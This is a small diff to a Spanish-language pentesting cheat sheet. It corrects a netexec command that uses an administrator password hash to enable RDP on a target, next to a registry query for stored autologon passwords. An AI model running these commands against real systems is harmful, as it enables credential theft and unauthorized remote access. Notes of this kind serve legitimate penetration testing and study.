@@ -167,5 +167,6 @@ Get-ItemProperty . | select-Object DefaultDomainName, DefaultUserName, DefaultPa
 
 ### Habilitar el RDP
 
-
-netexec smb IP -u administrator -H hash -m rdp -o ACTION=enable
+```python
+netexec smb IP -u administrator -H hash -M rdp -o ACTION=enable
+```
